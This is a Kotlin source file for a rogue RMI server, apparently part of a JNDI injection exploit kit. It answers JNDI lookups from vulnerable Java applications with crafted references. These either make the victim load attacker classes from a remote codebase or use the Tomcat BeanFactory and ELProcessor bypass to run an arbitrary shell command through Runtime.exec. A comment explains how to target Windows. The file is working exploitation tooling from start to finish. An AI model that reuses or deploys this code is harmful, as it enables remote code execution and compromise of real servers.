import com.sun.jndi.rmi.registry.ReferenceWrapper
import org.apache.naming.ResourceRef
import sun.rmi.server.UnicastServerRef
import sun.rmi.transport.TransportConstants
import util.Dict
import util.Reflection
import util.currentTime
import java.io.*
import java.net.URL
import java.net.URLClassLoader
import java.rmi.server.ObjID
import java.rmi.server.RemoteObject
import java.rmi.server.UID
import javax.naming.StringRefAddr


class RMIServer(val port: Int, val command: String, val codebase: URL) {

    fun run() {
        println("${currentTime()} [RMISERVER]>> Listening on 0.0.0.0:$port")

        val server = java.net.ServerSocket(port)

        while (true) {
            val socket = server.accept().apply { soTimeout = 5000 }
            println("${currentTime()} [RMISERVER]>> A connection from ${socket.remoteSocketAddress}")

            val input = socket.getInputStream()
            val bis = if (input.markSupported()) input else BufferedInputStream(input)

            bis.mark(4)
            try {
                val dis = DataInputStream(bis)
                val magic = dis.readInt()
                val version = dis.readShort()
                if (magic != TransportConstants.Magic || version != TransportConstants.Version) {
                    socket.close()
                    continue
                }

                val output = socket.getOutputStream()
                val dos = DataOutputStream(BufferedOutputStream(output))

                when (dis.readByte()) {
                    TransportConstants.StreamProtocol -> {
                        dos.run {
                            // acknowledging support for the protocol
                            writeByte(TransportConstants.ProtocolAck.toInt())
                            // EndpointIdentifier (hostname and port)
                            writeUTF(socket.inetAddress.hostName)
                            writeInt(socket.port)
                            flush()
                        }

                        // read EndpointIdentifier from client
                        dis.readUTF()
                        dis.readInt()

                        parseMessage(dis, dos)
                    }
                    TransportConstants.SingleOpProtocol -> parseMessage(dis, dos)
                    TransportConstants.MultiplexProtocol -> {
                        println("${currentTime()} [RMISERVER]>> MultiplexProtocol is unsupported")
                        socket.close()
                        continue
                    }
                    else -> {
                        println("${currentTime()} [RMISERVER]>> Unknown protocol")
                        socket.close()
                        continue
                    }
                }
            } catch (e: Exception) {
                println("${currentTime()} [RMISERVER]>> Closing connection")
                socket.close()
            }
        }
    }

    /**
     * Parsing message wrapped within SingleOpProtocol.
     * The SingleOpProtocol is used for invocation embedded in HTTP requests.
     */
    private fun parseMessage(input: DataInputStream, output: DataOutputStream) {
        println("${currentTime()} [RMISERVER]>> Reading message...")

        when (val op = input.readByte()) {
            TransportConstants.Call -> doRMICall(input, output)
            TransportConstants.Ping -> output.writeByte(TransportConstants.PingAck.toInt())
            TransportConstants.DGCAck -> UID.read(input)
            else -> throw IOException("${currentTime()} [RMISERVER]>> Unknown transport op $op")
        }
    }

    private fun doRMICall(input: DataInputStream, output: DataOutputStream) {
        val ois = object : ObjectInputStream(input) {
            override fun resolveClass(desc: ObjectStreamClass): Class<*> {
                return when (desc.name) {
                    "[Ljava.rmi.jndi.ObjID;" -> Array<ObjID>::class.java
                    "java.rmi.jndi.ObjID" -> ObjID::class.java
                    "java.rmi.jndi.UID" -> UID::class.java
                    "java.lang.String" -> String::class.java
                    else -> throw IOException("${currentTime()} [RMISERVER]>> Not allowed to read object")
                }
            }
        }

        when (ObjID.read(ois).hashCode()) {
            2 -> handleDGC(ois)
            0 -> handleRMI(ois, output)
        }
    }

    private fun handleRMI(ois: ObjectInputStream, ods: DataOutputStream) {
        val method = ois.readInt()
        ois.readLong()

        if (method != 2) return

        // random string
        val obj = ois.readObject() as String
        println("${currentTime()} [RMISERVER]>> Is RMI.lookup call for $obj $method")

        val classPath = codebase.toString()
        val ref = Dict.references[obj]

        if (ref == null) {
            println("${currentTime()} [RMISERVER]>> Reference that matches the name($obj) is not found.")
            return
        }

        val url = URL("$classPath#$ref")
        ods.writeByte(TransportConstants.Return.toInt())
        val oos = MarshalOutputStream(ods, url)
        oos.writeByte(TransportConstants.NormalReturn.toInt())
        UID().write(oos)

        val refWrapper = Reflection.createWithoutConstructor(ReferenceWrapper::class.java)
        if (ref.startsWith("Bypass")) {
            println("${currentTime()} [RMISERVER]>> Sending local classloading reference")
            Reflection.setFieldValue(refWrapper, "wrappee", execByEL())
        } else {
            println("${currentTime()} [RMISERVER]>> Sending remote classloading stub targeting ${URL("$classPath$ref.class")}")
            Reflection.setFieldValue(refWrapper, "wrappee", javax.naming.Reference("foo", ref, url.toString()))
        }
        val refField = RemoteObject::class.java.getDeclaredField("ref")
        refField.isAccessible = true
        refField.set(refWrapper, UnicastServerRef(12345))
        oos.writeObject(refWrapper)
        oos.flush()
        ods.flush()
    }

    private fun execByEL() =
        ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null).apply {
            //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
            add(StringRefAddr("forceString", "x=eval"))
            //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
            add(
                StringRefAddr(
                    "x",
                    """
                    |"".getClass()
                    |.forName("javax.script.ScriptEngineManager")
                    |.newInstance()
                    |.getEngineByName("JavaScript")
                    |.eval("java.lang.Runtime.getRuntime().exec('$command')")"""
                        .trimMargin().replace("\n", "")
                )
            )
        }

    private fun handleDGC(oiStream: ObjectInputStream) {
        oiStream.readInt()
        oiStream.readLong()
        println("${currentTime()} [RMISERVER]>> A DGC call for ${oiStream.readObject() as Array<*>}")
    }
}

class MarshalOutputStream(stream: OutputStream, val url: URL?) : ObjectOutputStream(stream) {
    override fun annotateClass(cl: Class<*>?) {
        if (url != null) {
            writeObject(url.toString())
        } else if (cl?.classLoader !is URLClassLoader) {
            writeObject(null)
        } else {
            val urls = (cl.classLoader as URLClassLoader).urLs
            val sum = urls.fold("") { sum, url ->
                sum + url.toString()
            }
            writeObject(sum)
        }
    }

    override fun annotateProxyClass(cl: Class<*>?) {
        annotateClass(cl)
    }
}
